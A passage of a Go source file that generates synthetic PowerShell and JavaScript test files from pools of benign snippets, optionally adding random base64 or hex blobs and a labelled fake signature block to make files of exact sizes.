	"$netAdapters = Get-NetAdapter | Where-Object { $_.Status -eq \"Up\" }\r\nforeach ($adapter in $netAdapters) {\r\n\t$ipConfig = Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue\r\n\tif ($ipConfig) {\r\n\t\tWrite-Output \"$($adapter.Name): $($ipConfig.IPAddress)/$($ipConfig.PrefixLength)\"\r\n\t}\r\n}\r\n",
	"$schedParams = @{\r\n\tTaskName    = \"DailyMaintenance\"\r\n\tDescription = \"Runs nightly cleanup tasks\"\r\n\tTrigger     = New-ScheduledTaskTrigger -Daily -At \"02:00\"\r\n\tAction      = New-ScheduledTaskAction -Execute \"PowerShell.exe\" -Argument \"-NonInteractive -File C:\\Scripts\\cleanup.ps1\"\r\n\tRunLevel    = \"Highest\"\r\n}\r\nRegister-ScheduledTask @schedParams -Force\r\n",
	"[string[]]$excludeList = @(\"SYSTEM\", \"LOCAL SERVICE\", \"NETWORK SERVICE\", \"DWM-1\", \"UMFD-0\")\r\n$userSessions = Get-WmiObject Win32_LoggedOnUser |\r\n\tWhere-Object { $excludeList -notcontains $_.Antecedent.Split('\"')[1] } |\r\n\tSelect-Object -ExpandProperty Antecedent\r\n",
	"# BEGIN MODULE INIT\r\n$script:Config = @{}\r\n$script:LogFile = $null\r\n$script:Initialized = $false\r\nif ($PSCommandPath) {\r\n\t$script:ModuleRoot = Split-Path -Parent $PSCommandPath\r\n}\r\n# END MODULE INIT\r\n",
	"function Invoke-RetryCommand {\r\n\tparam(\r\n\t\t[scriptblock]$Command,\r\n\t\t[int]$MaxAttempts = 3,\r\n\t\t[int]$DelaySeconds = 5\r\n\t)\r\n\t$attempt = 0\r\n\twhile ($attempt -lt $MaxAttempts) {\r\n\t\ttry { return & $Command }\r\n\t\tcatch { $attempt++; Start-Sleep $DelaySeconds }\r\n\t}\r\n\tthrow \"Command failed after $MaxAttempts attempts\"\r\n}\r\n",
	"$eventLog = New-Object System.Diagnostics.EventLog(\"Application\")\r\n$eventLog.Source = \"CustomScript\"\r\n$entries = $eventLog.Entries | Where-Object {\r\n\t$_.TimeGenerated -gt (Get-Date).AddHours(-24) -and\r\n\t$_.EntryType -eq \"Error\"\r\n}\r\nWrite-Output \"Critical events in last 24h: $($entries.Count)\"\r\n",
	"function Get-FileHashMD5 {\r\n\tparam([string]$FilePath)\r\n\t$md5 = [System.Security.Cryptography.MD5]::Create()\r\n\t$stream = [System.IO.File]::OpenRead($FilePath)\r\n\ttry { return [BitConverter]::ToString($md5.ComputeHash($stream)).Replace(\"-\", \"\").ToLower() }\r\n\tfinally { $stream.Close() }\r\n}\r\n",
	"$wshShell = New-Object -ComObject WScript.Shell\r\nforeach ($lnk in (Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\" -Recurse -Filter \"*.lnk\")) {\r\n\t$shortcut = $wshShell.CreateShortcut($lnk.FullName)\r\n\tWrite-Verbose \"Target: $($shortcut.TargetPath)\"\r\n}\r\n",
	"$ErrorActionPreference = \"Stop\"\r\n$VerbosePreference = \"Continue\"\r\n$ProgressPreference = \"SilentlyContinue\"\r\n$WarningPreference = \"Continue\"\r\n",
	"if ([System.Environment]::OSVersion.Version.Major -ge 10) {\r\n\t$build = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').CurrentBuild\r\n\tWrite-Verbose \"Windows 10/11 build $build detected\"\r\n}\r\nelse {\r\n\tWrite-Warning \"This script requires Windows 10 or later\"\r\n\texit 1\r\n}\r\n",
	"$pipelineResult = Get-Process |\r\n\tWhere-Object { $_.WorkingSet64 -gt 100MB } |\r\n\tSort-Object WorkingSet64 -Descending |\r\n\tSelect-Object Name, @{N='MemMB';E={[math]::Round($_.WorkingSet64/1MB,1)}} |\r\n\tFormat-Table -AutoSize\r\n",
	"function Export-ConfigToJson {\r\n\tparam([hashtable]$Config, [string]$OutputPath)\r\n\t$Config | ConvertTo-Json -Depth 5 | Set-Content -Path $OutputPath -Encoding UTF8\r\n\tWrite-Verbose \"Config written to $OutputPath\"\r\n}\r\n",
	"$hereContent = @\"\r\n[global]\r\nserver_name = $($env:COMPUTERNAME)\r\nlog_level   = debug\r\nmax_threads = 8\r\n\r\n[database]\r\nhost = localhost\r\nport = 5432\r\n\"@\r\n",
	"$diskInfo = Get-PSDrive -PSProvider FileSystem | Select-Object Name,\r\n\t@{N='UsedGB';E={[math]::Round(($_.Used/1GB),2)}},\r\n\t@{N='FreeGB';E={[math]::Round(($_.Free/1GB),2)}}\r\nWrite-Output ($diskInfo | Format-Table -AutoSize | Out-String)\r\n",
	"Set-StrictMode -Version Latest\r\nif ($PSVersionTable.PSVersion.Major -lt 5) {\r\n\tWrite-Error \"PowerShell 5.0 or later is required. Current: $($PSVersionTable.PSVersion)\"\r\n\texit 1\r\n}\r\n",
}

// fillWithPSSnippets assembles a byte slice of exactly `target` bytes by
// repeatedly appending randomly selected PowerShell snippets. 20% of snippet
// selections have \r\n line endings converted to \n.
func fillWithPSSnippets(rng *rand.Rand, target int) []byte {
	buf := make([]byte, 0, target+512)
	for len(buf) < target {
		s := psSnippets[rng.IntN(len(psSnippets))]
		if rng.IntN(10) < 2 {
			s = strings.ReplaceAll(s, "\r\n", "\n")
		}
		rem := target - len(buf)
		if len(s) > rem {
			buf = append(buf, s[:rem]...)
		} else {
			buf = append(buf, s...)
		}
	}
	return buf
}

// genPowerShellPure produces a synthetic PowerShell script assembled from a
// pool of realistic snippets, with mixed \r\n / \n line endings.
func genPowerShellPure(rng *rand.Rand, size int) []byte {
	return fillWithPSSnippets(rng, size)
}

// genPowerShellEmbeddedB64 produces a PowerShell script with 1–3 embedded
// base64-encoded binary blobs inserted after the initial script body.
func genPowerShellEmbeddedB64(rng *rand.Rand, size int) []byte {
	// Fill 60–80% of the size budget with script content
	scriptFrac := 0.60 + rng.Float64()*0.20
	scriptTarget := int(float64(size) * scriptFrac)
	buf := fillWithPSSnippets(rng, scriptTarget)

	numBlobs := 1 + rng.IntN(3)
	blobVarNames := []string{"encodedPayload", "binaryData", "rawPayload", "encodedBytes", "base64Buffer"}
	remaining := size - len(buf)

	for i := 0; i < numBlobs && remaining > 80; i++ {
		portion := remaining
		if i < numBlobs-1 {
			portion = remaining / (numBlobs - i)
		}
		varName := blobVarNames[rng.IntN(len(blobVarNames))]
		// Syntax overhead: header + footer lines
		overhead := len(fmt.Sprintf("$%s = @\"\r\n\r\n\"@\r\n$decoded_%d = [System.Convert]::FromBase64String($%s)\r\n", varName, i, varName))
		encodedSize := portion - overhead
		if encodedSize < 4 {
			encodedSize = 4
		}
		rawSize := encodedSize * 3 / 4
		if rawSize < 1 {
			rawSize = 1
		}
		rawBytes := make([]byte, rawSize)
		for j := range rawBytes {
			rawBytes[j] = byte(rng.Uint32())
		}
		encoded := base64.StdEncoding.EncodeToString(rawBytes)
		blob := fmt.Sprintf("$%s = @\"\r\n%s\r\n\"@\r\n$decoded_%d = [System.Convert]::FromBase64String($%s)\r\n",
			varName, encoded, i, varName)
		buf = append(buf, blob...)
		remaining -= len(blob)
	}

	// Pad or trim to exact size
	for len(buf) < size {
		pad := fmt.Sprintf("# pad %08X\r\n", rng.Uint32())
		rem := size - len(buf)
		if len(pad) > rem {
			buf = append(buf, pad[:rem]...)
		} else {
			buf = append(buf, pad...)
		}
	}
	return buf[:size]
}

// genPowerShellEmbeddedHex produces a PowerShell script with 1–3 embedded
// uppercase-hex-encoded binary blobs inserted after the initial script body.
func genPowerShellEmbeddedHex(rng *rand.Rand, size int) []byte {
	scriptFrac := 0.60 + rng.Float64()*0.20
	scriptTarget := int(float64(size) * scriptFrac)
	buf := fillWithPSSnippets(rng, scriptTarget)

	numBlobs := 1 + rng.IntN(3)
	blobVarNames := []string{"hexPayload", "hexBuffer", "rawHexData", "encodedHex", "hexBytes"}
	remaining := size - len(buf)

	for i := 0; i < numBlobs && remaining > 80; i++ {
		portion := remaining
		if i < numBlobs-1 {
			portion = remaining / (numBlobs - i)
		}
		varName := blobVarNames[rng.IntN(len(blobVarNames))]
		overhead := len(fmt.Sprintf("$%s = \"\"\r\n$bytes_%d = [byte[]]::new($%s.Length / 2)\r\n", varName, i, varName))
		hexSize := portion - overhead
		if hexSize < 2 {
			hexSize = 2
		}
		rawSize := hexSize / 2
		if rawSize < 1 {
			rawSize = 1
		}
		rawBytes := make([]byte, rawSize)
		for j := range rawBytes {
			rawBytes[j] = byte(rng.Uint32())
		}
		encoded := strings.ToUpper(hex.EncodeToString(rawBytes))
		blob := fmt.Sprintf("$%s = \"%s\"\r\n$bytes_%d = [byte[]]::new($%s.Length / 2)\r\n",
			varName, encoded, i, varName)
		buf = append(buf, blob...)
		remaining -= len(blob)
	}

	for len(buf) < size {
		pad := fmt.Sprintf("# pad %08X\r\n", rng.Uint32())
		rem := size - len(buf)
		if len(pad) > rem {
			buf = append(buf, pad[:rem]...)
		} else {
			buf = append(buf, pad...)
		}
	}
	return buf[:size]
}

// genPowerShellSigned generates a PowerShell file (pure, b64-embedded, or
// hex-embedded, chosen randomly) and appends a structurally correct but fake
// Authenticode signature block.
func genPowerShellSigned(rng *rand.Rand, size int) []byte {
	baseGens := []func(*rand.Rand, int) []byte{
		genPowerShellPure,
		genPowerShellEmbeddedB64,
		genPowerShellEmbeddedHex,
	}
	base := baseGens[rng.IntN(3)](rng, size)

	// Build fake signature block
	const b64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
	var sig []byte
	sig = append(sig, "\r\n# SIG # Begin signature block\r\n"...)
	numLines := 20 + rng.IntN(21) // 20–40 lines
	lineArr := make([]byte, 76)
	for i := 0; i < numLines; i++ {
		for j := range lineArr {
			lineArr[j] = b64Chars[rng.IntN(len(b64Chars))]
		}
		sig = append(sig, "# "...)
		sig = append(sig, lineArr...)
		sig = append(sig, '\r', '\n')
	}
	sig = append(sig, "# SIG # End signature block\r\n"...)

	return append(base, sig...)
}

// ---------------------------------------------------------------------------
// JavaScript snippet pool and generators
// ---------------------------------------------------------------------------

// jsSnippets is a pool of syntactically plausible JavaScript fragments using
// Unix-style \n line endings.
var jsSnippets = []string{
	"const EPSILON = 1e-10;\nconst MAX_ITERATIONS = 1000;\nconst DEFAULT_TOLERANCE = 1e-6;\n",
	"let vertices = [];\nlet edges = new Map();\nlet visited = new Set();\n",
	"const normalize = (v) => {\n  const len = Math.sqrt(v.x * v.x + v.y * v.y + v.z * v.z);\n  return len > EPSILON ? { x: v.x / len, y: v.y / len, z: v.z / len } : { x: 0, y: 0, z: 0 };\n};\n",
	"function clamp(value, min, max) {\n  return Math.min(Math.max(value, min), max);\n}\n\nfunction lerp(a, b, t) {\n  return a + (b - a) * clamp(t, 0, 1);\n}\n",
	"export function computeBoundingBox(points) {\n  if (points.length === 0) return null;\n  let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;\n  for (const p of points) {\n    minX = Math.min(minX, p.x);\n    minY = Math.min(minY, p.y);\n    maxX = Math.max(maxX, p.x);\n    maxY = Math.max(maxY, p.y);\n  }\n  return { minX, minY, maxX, maxY, width: maxX - minX, height: maxY - minY };\n}\n",
	"/**\n * Computes the dot product of two 2D vectors.\n * @param {{x: number, y: number}} a - First vector.\n * @param {{x: number, y: number}} b - Second vector.\n * @returns {number} The scalar dot product.\n */\nfunction dot2D(a, b) {\n  return a.x * b.x + a.y * b.y;\n}\n",
	"class Vector2 {\n  constructor(x = 0, y = 0) {\n    this.x = x;\n    this.y = y;\n  }\n  length() { return Math.sqrt(this.x * this.x + this.y * this.y); }\n  add(other) { return new Vector2(this.x + other.x, this.y + other.y); }\n  scale(factor) { return new Vector2(this.x * factor, this.y * factor); }\n  toString() { return `Vector2(${this.x}, ${this.y})`; }\n}\n",
	"const triangleArea = (a, b, c) => {\n  const ax = b.x - a.x, ay = b.y - a.y;\n  const bx = c.x - a.x, by = c.y - a.y;\n  return Math.abs(ax * by - ay * bx) / 2;\n};\n",
	"const colorPalette = [\n  { r: 255, g: 87, b: 51 },\n  { r: 70, g: 130, b: 180 },\n  { r: 50, g: 205, b: 50 },\n  { r: 255, g: 215, b: 0 },\n];\nconst toHex = ({ r, g, b }) =>\n  '#' + [r, g, b].map(v => v.toString(16).padStart(2, '0')).join('');\n",
	"const dataPoints = rawValues\n  .filter(v => v !== null && !isNaN(v))\n  .map(v => ({ value: v, normalized: (v - minVal) / (maxVal - minVal) }))\n  .sort((a, b) => a.value - b.value);\n",
	"for (let i = 0; i < matrix.length; i++) {\n  for (let j = 0; j < matrix[i].length; j++) {\n    if (Math.abs(matrix[i][j]) < EPSILON) {\n      matrix[i][j] = 0;\n    }\n  }\n}\n",
	"function debounce(fn, delay) {\n  let timer = null;\n  return function (...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delay);\n  };\n}\n",
	"const stats = values.reduce((acc, x) => {\n  acc.sum += x;\n  acc.sumSq += x * x;\n  acc.count++;\n  acc.min = Math.min(acc.min, x);\n  acc.max = Math.max(acc.max, x);\n  return acc;\n}, { sum: 0, sumSq: 0, count: 0, min: Infinity, max: -Infinity });\nconst mean = stats.sum / stats.count;\nconst variance = stats.sumSq / stats.count - mean * mean;\n",
	"// Binary search: returns index of target or -1 if not found\nfunction binarySearch(arr, target) {\n  let lo = 0, hi = arr.length - 1;\n  while (lo <= hi) {\n    const mid = (lo + hi) >>> 1;\n    if (arr[mid] === target) return mid;\n    else if (arr[mid] < target) lo = mid + 1;\n    else hi = mid - 1;\n  }\n  return -1;\n}\n",
	"export class EventEmitter {\n  constructor() { this._listeners = new Map(); }\n  on(event, fn) {\n    if (!this._listeners.has(event)) this._listeners.set(event, []);\n    this._listeners.get(event).push(fn);\n    return this;\n  }\n  emit(event, ...args) {\n    (this._listeners.get(event) ?? []).forEach(fn => fn(...args));\n  }\n  off(event, fn) {\n    const list = this._listeners.get(event) ?? [];\n    this._listeners.set(event, list.filter(f => f !== fn));\n  }\n}\n",
	"const memoize = (fn) => {\n  const cache = new Map();\n  return (...args) => {\n    const key = JSON.stringify(args);\n    if (cache.has(key)) return cache.get(key);\n    const result = fn(...args);\n    cache.set(key, result);\n    return result;\n  };\n};\n",
	"/**\n * @typedef {Object} Transform\n * @property {number} tx - Translation X\n * @property {number} ty - Translation Y\n * @property {number} scaleX - Scale factor X\n * @property {number} scaleY - Scale factor Y\n * @property {number} rotation - Rotation in radians\n */\n/** @type {Transform} */\nconst identity = { tx: 0, ty: 0, scaleX: 1, scaleY: 1, rotation: 0 };\n",
	"switch (token.type) {\n  case 'NUMBER':\n    return parseFloat(token.value);\n  case 'STRING':\n    return token.value.slice(1, -1);\n  case 'BOOLEAN':\n    return token.value === 'true';\n  case 'NULL':\n    return null;\n  default:\n    throw new SyntaxError(`Unexpected token: ${token.type}`);\n}\n",
	"async function fetchWithRetry(url, options = {}, maxAttempts = 3) {\n  for (let attempt = 1; attempt <= maxAttempts; attempt++) {\n    try {\n      const response = await fetch(url, options);\n      if (!response.ok) throw new Error(`HTTP ${response.status}`);\n      return await response.json();\n    } catch (err) {\n      if (attempt === maxAttempts) throw err;\n      await new Promise(r => setTimeout(r, 200 * attempt));\n    }\n  }\n}\n",
	"const pipeline = (...fns) => (x) => fns.reduce((v, f) => f(v), x);\n\nconst processValue = pipeline(\n  x => x * 2,\n  x => x + 10,\n  x => Math.round(x * 100) / 100,\n  x => ({ value: x, timestamp: Date.now() })\n);\n",
	"function* range(start, stop, step = 1) {\n  for (let i = start; step > 0 ? i < stop : i > stop; i += step) {\n    yield i;\n  }\n}\nconst evens = [...range(0, 20, 2)];\n",
	"const { x: px, y: py, ...rest } = sourcePoint;\nconst [first, second, ...remaining] = sortedArray;\nconst merged = { ...defaultConfig, ...userConfig, timestamp: Date.now() };\n",
	"export default class Grid {\n  #rows;\n  #cols;\n  #data;\n  constructor(rows, cols, fill = 0) {\n    this.#rows = rows;\n    this.#cols = cols;\n    this.#data = new Float64Array(rows * cols).fill(fill);\n  }\n  get(r, c) { return this.#data[r * this.#cols + c]; }\n  set(r, c, v) { this.#data[r * this.#cols + c] = v; }\n  get size() { return { rows: this.#rows, cols: this.#cols }; }\n}\n",
	"const intersectSegments = (p1, p2, p3, p4) => {\n  const d1x = p2.x - p1.x, d1y = p2.y - p1.y;\n  const d2x = p4.x - p3.x, d2y = p4.y - p3.y;\n  const cross = d1x * d2y - d1y * d2x;\n  if (Math.abs(cross) < EPSILON) return null;\n  const t = ((p3.x - p1.x) * d2y - (p3.y - p1.y) * d2x) / cross;\n  const u = ((p3.x - p1.x) * d1y - (p3.y - p1.y) * d1x) / cross;\n  return (t >= 0 && t <= 1 && u >= 0 && u <= 1)\n    ? { x: p1.x + t * d1x, y: p1.y + t * d1y }\n    : null;\n};\n",
	"// Quadratic Bezier curve evaluation at parameter t\nfunction evalBezier2(p0, p1, p2, t) {\n  const mt = 1 - t;\n  return {\n    x: mt * mt * p0.x + 2 * mt * t * p1.x + t * t * p2.x,\n    y: mt * mt * p0.y + 2 * mt * t * p1.y + t * t * p2.y,\n  };\n}\n",
	"function dispatch(task) {\n  const MAX_WORKERS = navigator?.hardwareConcurrency ?? 4;\n  if (activeWorkers < MAX_WORKERS) {\n    activeWorkers++;\n    runTask(task).finally(() => {\n      activeWorkers--;\n      if (taskQueue.length > 0) dispatch(taskQueue.shift());\n    });\n  } else {\n    taskQueue.push(task);\n  }\n}\n",
	"const parseQueryString = (qs) =>\n  Object.fromEntries(\n    (qs.startsWith('?') ? qs.slice(1) : qs)\n      .split('&')\n      .filter(Boolean)\n      .map(pair => pair.split('=').map(decodeURIComponent))\n  );\n",
	"try {\n  const data = JSON.parse(rawInput);\n  if (!Array.isArray(data.items)) throw new TypeError('items must be an array');\n  const validated = data.items.map((item, idx) => {\n    if (typeof item.id !== 'number') throw new TypeError(`item[${idx}].id must be number`);\n    return { id: item.id, label: String(item.label ?? ''), active: Boolean(item.active) };\n  });\n  return { ok: true, items: validated };\n} catch (e) {\n  return { ok: false, error: e.message };\n}\n",
	"const formatDuration = (ms) => {\n  const s = Math.floor(ms / 1000);\n  const m = Math.floor(s / 60);\n  const h = Math.floor(m / 60);\n  return h > 0\n    ? `${h}h ${m % 60}m ${s % 60}s`\n    : m > 0\n    ? `${m}m ${s % 60}s`\n    : `${s}s`;\n};\n",
	"export function buildAdjacencyList(edges) {\n  const graph = new Map();\n  for (const [u, v, weight = 1] of edges) {\n    if (!graph.has(u)) graph.set(u, []);\n    if (!graph.has(v)) graph.set(v, []);\n    graph.get(u).push({ node: v, weight });\n    graph.get(v).push({ node: u, weight });\n  }\n  return graph;\n}\n",
	"// Dijkstra shortest path\nfunction dijkstra(graph, source) {\n  const dist = new Map();\n  const pq = [[0, source]];\n  dist.set(source, 0);\n  while (pq.length > 0) {\n    pq.sort((a, b) => a[0] - b[0]);\n    const [d, u] = pq.shift();\n    if (d > (dist.get(u) ?? Infinity)) continue;\n    for (const { node: v, weight: w } of (graph.get(u) ?? [])) {\n      const nd = d + w;\n      if (nd < (dist.get(v) ?? Infinity)) { dist.set(v, nd); pq.push([nd, v]); }\n    }\n  }\n  return dist;\n}\n",
	"const observer = new IntersectionObserver((entries) => {\n  entries.forEach(entry => {\n    const ratio = entry.intersectionRatio;\n    entry.target.style.opacity = String(ratio);\n    entry.target.dataset.visible = ratio > 0.5 ? 'true' : 'false';\n  });\n}, { threshold: [0, 0.25, 0.5, 0.75, 1] });\ndocument.querySelectorAll('[data-observe]').forEach(el => observer.observe(el));\n",
	"function* fibonacci() {\n  let [a, b] = [0, 1];\n  while (true) { yield a; [a, b] = [b, a + b]; }\n}\nconst fib10 = Array.from({ length: 10 }, (_, i) => {\n  const gen = fibonacci();\n  for (let j = 0; j < i; j++) gen.next();\n  return gen.next().value;\n});\n",
	"const throttle = (fn, limit) => {\n  let lastRun = 0;\n  return function (...args) {\n    const now = Date.now();\n    if (now - lastRun >= limit) { lastRun = now; return fn.apply(this, args); }\n  };\n};\n",
	"/**\n * Deep equality check between two values.\n * @param {*} a\n * @param {*} b\n * @returns {boolean}\n */\nfunction deepEqual(a, b) {\n  if (a === b) return true;\n  if (typeof a !== typeof b || typeof a !== 'object' || a === null) return false;\n  const ka = Object.keys(a), kb = Object.keys(b);\n  if (ka.length !== kb.length) return false;\n  return ka.every(k => deepEqual(a[k], b[k]));\n}\n",
	"class LRUCache {\n  constructor(capacity) {\n    this.capacity = capacity;\n    this.cache = new Map();\n  }\n  get(key) {\n    if (!this.cache.has(key)) return -1;\n    const val = this.cache.get(key);\n    this.cache.delete(key);\n    this.cache.set(key, val);\n    return val;\n  }\n  put(key, value) {\n    if (this.cache.has(key)) this.cache.delete(key);\n    else if (this.cache.size >= this.capacity) this.cache.delete(this.cache.keys().next().value);\n    this.cache.set(key, value);\n  }\n}\n",
	"const flattenDeep = (arr) =>\n  arr.reduce((acc, val) =>\n    Array.isArray(val) ? acc.concat(flattenDeep(val)) : acc.concat(val), []);\n\nconst groupBy = (arr, fn) =>\n  arr.reduce((acc, x) => { const k = fn(x); (acc[k] = acc[k] || []).push(x); return acc; }, {});\n",
	"function promiseAllSettled(promises) {\n  return Promise.all(promises.map(p =>\n    Promise.resolve(p)\n      .then(value => ({ status: 'fulfilled', value }))\n      .catch(reason => ({ status: 'rejected', reason }))\n  ));\n}\n",
}

// fillWithJSSnippets assembles a byte slice of exactly `target` bytes by
// repeatedly appending randomly selected JavaScript snippets.
func fillWithJSSnippets(rng *rand.Rand, target int) []byte {
	buf := make([]byte, 0, target+512)
	for len(buf) < target {
		s := jsSnippets[rng.IntN(len(jsSnippets))]
		rem := target - len(buf)
		if len(s) > rem {
			buf = append(buf, s[:rem]...)
		} else {
			buf = append(buf, s...)
		}
	}
	return buf
}

// genJavaScriptPure produces a synthetic JavaScript file assembled from a
// pool of realistic snippets with Unix-style \n line endings.
func genJavaScriptPure(rng *rand.Rand, size int) []byte {
	return fillWithJSSnippets(rng, size)
}

// genJavaScriptEmbeddedB64 produces a JavaScript file with 1–3 embedded
// base64-encoded binary blobs in string constants.
func genJavaScriptEmbeddedB64(rng *rand.Rand, size int) []byte {
	scriptFrac := 0.60 + rng.Float64()*0.20
	scriptTarget := int(float64(size) * scriptFrac)
	buf := fillWithJSSnippets(rng, scriptTarget)

	numBlobs := 1 + rng.IntN(3)
	blobVarNames := []string{"encodedData", "binaryPayload", "base64Blob", "rawEncoded", "encodedBuffer"}
	remaining := size - len(buf)

	for i := 0; i < numBlobs && remaining > 80; i++ {
		portion := remaining
		if i < numBlobs-1 {
			portion = remaining / (numBlobs - i)
		}
		varName := blobVarNames[rng.IntN(len(blobVarNames))]
		overhead := len(fmt.Sprintf("const %s = \"\";\nconst decoded%d = atob(%s);\n", varName, i, varName))
		encodedSize := portion - overhead
		if encodedSize < 4 {
			encodedSize = 4
		}
		rawSize := encodedSize * 3 / 4
		if rawSize < 1 {
			rawSize = 1
		}
		rawBytes := make([]byte, rawSize)
		for j := range rawBytes {
			rawBytes[j] = byte(rng.Uint32())
		}
		encoded := base64.StdEncoding.EncodeToString(rawBytes)
		blob := fmt.Sprintf("const %s = \"%s\";\nconst decoded%d = atob(%s);\n",
			varName, encoded, i, varName)
		buf = append(buf, blob...)
		remaining -= len(blob)
	}

	for len(buf) < size {
		pad := fmt.Sprintf("// pad %08x\n", rng.Uint32())
		rem := size - len(buf)
		if len(pad) > rem {
			buf = append(buf, pad[:rem]...)
		} else {
			buf = append(buf, pad...)
		}
	}
	return buf[:size]
}

// genJavaScriptEmbeddedHex produces a JavaScript file with 1–3 embedded
// lowercase-hex-encoded binary blobs in string constants.
func genJavaScriptEmbeddedHex(rng *rand.Rand, size int) []byte {
	scriptFrac := 0.60 + rng.Float64()*0.20
	scriptTarget := int(float64(size) * scriptFrac)
	buf := fillWithJSSnippets(rng, scriptTarget)

	numBlobs := 1 + rng.IntN(3)
	blobVarNames := []string{"hexData", "hexBuffer", "rawHexBytes", "encodedHex", "hexPayload"}
	remaining := size - len(buf)

	for i := 0; i < numBlobs && remaining > 80; i++ {
		portion := remaining
		if i < numBlobs-1 {
			portion = remaining / (numBlobs - i)
		}
		varName := blobVarNames[rng.IntN(len(blobVarNames))]
		overhead := len(fmt.Sprintf("const %s = \"\";\nconst bytes%d = %s.match(/.{2}/g).map(b => parseInt(b, 16));\n", varName, i, varName))
		hexSize := portion - overhead
		if hexSize < 2 {
			hexSize = 2
		}
		rawSize := hexSize / 2
		if rawSize < 1 {
			rawSize = 1
		}
		rawBytes := make([]byte, rawSize)
		for j := range rawBytes {
			rawBytes[j] = byte(rng.Uint32())
		}
		encoded := hex.EncodeToString(rawBytes) // lowercase per spec
		blob := fmt.Sprintf("const %s = \"%s\";\nconst bytes%d = %s.match(/.{2}/g).map(b => parseInt(b, 16));\n",
			varName, encoded, i, varName)
		buf = append(buf, blob...)
		remaining -= len(blob)
	}

	for len(buf) < size {
		pad := fmt.Sprintf("// pad %08x\n", rng.Uint32())
		rem := size - len(buf)
		if len(pad) > rem {
			buf = append(buf, pad[:rem]...)
		} else {
			buf = append(buf, pad...)
		}
	}
	return buf[:size]
}
